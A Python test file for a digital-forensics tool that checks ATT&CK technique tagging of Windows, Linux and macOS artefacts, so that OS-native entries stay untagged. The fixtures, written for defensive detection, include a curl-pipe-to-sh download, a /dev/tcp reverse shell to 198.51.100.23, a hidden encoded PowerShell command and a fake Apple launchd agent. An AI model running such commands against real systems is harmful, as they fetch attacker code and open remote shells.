"""ATT&CK tags in mitre_techniques.txt come from what the records show: an artefact being there
tags only a persistence mechanism or interpreter, and keywords don't match what a clean OS ships."""

import json
import sys
from pathlib import Path

sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from rowanholt.process.extractions.artemis import enrich_with_mitre, to_json_lines  # noqa: E402
from rowanholt.process.extractions.mitre_tagger import presence_technique, tag_mitre_technique  # noqa: E402


def tagged(tmp_path: Path, artefact_type: str, records: list) -> set:
    cooked = tmp_path / "CASE" / "HOST" / "artefacts" / "cooked"
    cooked.mkdir(parents=True, exist_ok=True)
    path = cooked / f"{artefact_type}.json"
    path.write_text("\n".join(json.dumps(r) for r in records) + "\n")
    enrich_with_mitre(str(path), artefact_type)
    techniques = tmp_path / "CASE" / "mitre_techniques.txt"
    return set(techniques.read_text().split()) if techniques.exists() else set()


def test_a_clean_file_table_tags_nothing(tmp_path) -> None:
    clean = [{"full_path": p} for p in (
        ".\\Windows\\System32\\svchost.exe", ".\\Windows\\System32\\mshta.exe", ".\\Windows\\System32\\certutil.exe",
        ".\\$Recycle.Bin\\S-1-5-21\\desktop.ini", ".\\Program Files\\App\\readme.txt",
        ".\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini",
        ".\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\x.ps1")]
    assert tagged(tmp_path, "mft", clean) == set()  # no T1070.006 for having parsed it


def test_tools_windows_does_not_ship_still_tag(tmp_path) -> None:
    assert tagged(tmp_path, "mft", [{"full_path": ".\\Users\\a\\Downloads\\mimikatz.exe"},
                                    {"full_path": ".\\Users\\a\\Documents\\q3.xlsx.locked"}]) == {"T1003", "T1486"}


def test_the_table_tags_the_rows_the_techniques_come_from(tmp_path) -> None:
    """FR-07: the scan recorded an MFT's T1003 for the table as a whole, so the case report had
    no row to cite. The rows that name it now carry it, and only theirs are recorded."""
    cooked = tmp_path / "CASE" / "HOST" / "artefacts" / "cooked"
    cooked.mkdir(parents=True)
    rows = [{"full_path": ".\\Windows\\System32\\svchost.exe"},
            {"full_path": ".\\AtomicRedTeam\\atomics\\T1003\\bin\\mimikatz.exe", "size": 1},
            {"nested": {"filename": "AnyDesk.exe"}}]
    (cooked / "mft.json").write_text("\n".join(json.dumps(r) for r in rows) + "\n")
    table = to_json_lines(str(cooked / "mft.json"), str(cooked), "HOST::Windows10",
                          "/case/HOST/artefacts/raw/$MFT", "mft")
    enrich_with_mitre(table, "mft")
    lines = [json.loads(line) for line in Path(table).read_text().splitlines()]
    assert [line["techniques"] for line in lines] == [[], ["T1003"], ["T1219"]]
    assert set((tmp_path / "CASE" / "mitre_techniques.txt").read_text().split()) == {"T1003", "T1219"}


def test_failed_logons_past_the_threshold_tag_each_one(tmp_path) -> None:
    """FR-07: password guessing is a count across the Security log, so it was recorded for the log
    and no row carried it. Each failed logon now does, once there are enough of them."""
    def event(event_id):
        return {"data": {"Event": {"System": {"Channel": "Security", "EventID": event_id}, "EventData": {}}}}
    for count, want in ((4, []), (5, ["T1110", "T1110.001"])):
        cooked = tmp_path / str(count) / "CASE" / "HOST" / "artefacts" / "cooked"
        cooked.mkdir(parents=True)
        rows = [event(4624)] + [event(4625)] * count
        (cooked / "security.json").write_text("\n".join(json.dumps(r) for r in rows) + "\n")
        table = to_json_lines(str(cooked / "security.json"), str(cooked), "HOST::Windows10",
                              "/case/HOST/artefacts/raw/Security.evtx", "eventlogs")
        lines = [json.loads(line) for line in Path(table).read_text().splitlines()]
        assert [line["techniques"] for line in lines] == [[]] + [want] * count


def test_registry_names_are_not_dumping_or_modification(tmp_path) -> None:
    records = [{"key": "ROOT\\SYSTEM\\CurrentControlSet\\Services\\SamSs", "value": "%SystemRoot%\\system32\\lsass.exe"},
               {"key": "ROOT\\Software\\Classes\\VBSFile\\Shell\\Open\\Command", "value": "wscript.exe \"%1\""},
               {"key": "ROOT\\Software\\Microsoft\\Windows Defender\\Features", "value": "1"},
               {"key": "ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\X", "value": "MsiExec.exe /X{1}"}]
    assert tagged(tmp_path, "registry", records) == set()
    assert tagged(tmp_path, "registry", [{"key": "Run", "value": "powershell.exe -w hidden -enc AAAA"}]) == {"T1059.001"}


def test_presence_keeps_persistence_and_interpreters_only() -> None:
    for technique in ("T1053.005", "T1543.002", "T1546.003", "T1547.015", "T1059.004"):
        assert presence_technique(technique), technique
    for technique in ("T1070.002", "T1070.003", "T1070.006", "T1083", "T1112", "T1003.008", "T1087.001", "T1114"):
        assert not presence_technique(technique), technique


def test_windows_own_tasks_services_and_consumers_tag_nothing(tmp_path) -> None:
    def task(uri):
        return {"tasks": [{"registration_info": {"uri": uri}, "actions": {"exec": [{"command": "x.exe"}]}}]}
    own = [task("\\Microsoft\\Windows\\Defrag\\ScheduledDefrag"), task("\\MicrosoftEdgeUpdateTaskMachineCore{1}"),
           task("\\SoftLanding\\S-1-5-21-1-1000\\SoftLandingDeferralTask")]
    assert tagged(tmp_path, "tasks", own) == set()
    assert tagged(tmp_path / "b", "tasks", own + [task("\\LabSync")]) == {"T1053.005"}
    services = [{"name": "Dnscache", "path": "%SystemRoot%\\system32\\svchost.exe -k NetworkService"},
                {"name": "disk", "path": "\\SystemRoot\\System32\\drivers\\disk.sys"},
                {"name": "WinDefend", "path": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe\""}]
    assert tagged(tmp_path / "c", "services", services) == set()
    assert tagged(tmp_path / "d", "services", services + [
        {"name": "LabHelper", "path": "C:\\Windows\\System32\\cmd.exe /c exit 0"}]) == {"T1543.003", "T1059.003"}
    assert tagged(tmp_path / "e", "wmipersist", [{"consumer_name": "SCM Event Log Consumer"}]) == set()
    assert tagged(tmp_path / "f", "wmipersist", [{"consumer_name": "LabUpdaterConsumer"}]) == {"T1546.003"}


def test_a_log_existing_is_not_log_clearing(tmp_path) -> None:
    assert not tag_mitre_technique(str(tmp_path), "HOST", "journal")
    assert not (tmp_path / "mitre_techniques.txt").exists()
    assert tag_mitre_technique(str(tmp_path), "HOST", "bash_history")
    assert (tmp_path / "mitre_techniques.txt").read_text().split() == ["T1059.004"]  # not T1070.003


def test_linux_and_macos_tag_what_isnt_the_os_own() -> None:
    from rowanholt.process.extractions.mitre_tagger import launchd_technique, suspicious_shell, unusual_unit
    assert not suspicious_shell(["ls -la", "sudo apt update", "git pull", "curl --version"])
    assert suspicious_shell(["cd /tmp", "curl http://198.51.100.23/b | sh"])
    assert suspicious_shell(["echo aGk= | base64 -d", "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"])
    systemd_own = json.dumps([{"Process": "User Runtime Directory /run/user/%i",
                               "Command": "/usr/lib/systemd/systemd-user-runtime-dir start %i"}])
    assert not unusual_unit(systemd_own)
    assert unusual_unit(json.dumps([{"Process": "Lab sync", "Command": "/tmp/.x/update.sh"}]))
    assert unusual_unit("[Service]\nExecStart=/bin/sh -c 'curl http://x/a | sh'\n")
    apple = {"Label": "com.apple.mdworker.shared", "ProgramArguments": ["/System/Library/x/mdworker_shared"]}
    assert launchd_technique("Library+LaunchAgents+com.apple.mdworker.shared.plist", apple) is None
    assert launchd_technique("Library+LaunchDaemons+com.apple.x.plist", {"Label": "com.apple.x"}) is None
    lab = {"Label": "com.rivendell-lab.update", "ProgramArguments": ["/Users/Shared/.x/update.sh"]}
    assert launchd_technique("Library+LaunchAgents+com.rivendell-lab.update.plist", lab) == "T1543.001"
    # Named like Apple's but running from elsewhere: not Apple's
    fake = {"Label": "com.apple.updater", "ProgramArguments": ["/Users/Shared/.u/updater"]}
    assert launchd_technique("Library+LaunchDaemons+com.apple.updater.plist", fake) == "T1543.004"
    assert launchd_technique("Library+Preferences+com.example.app.plist", lab) is None
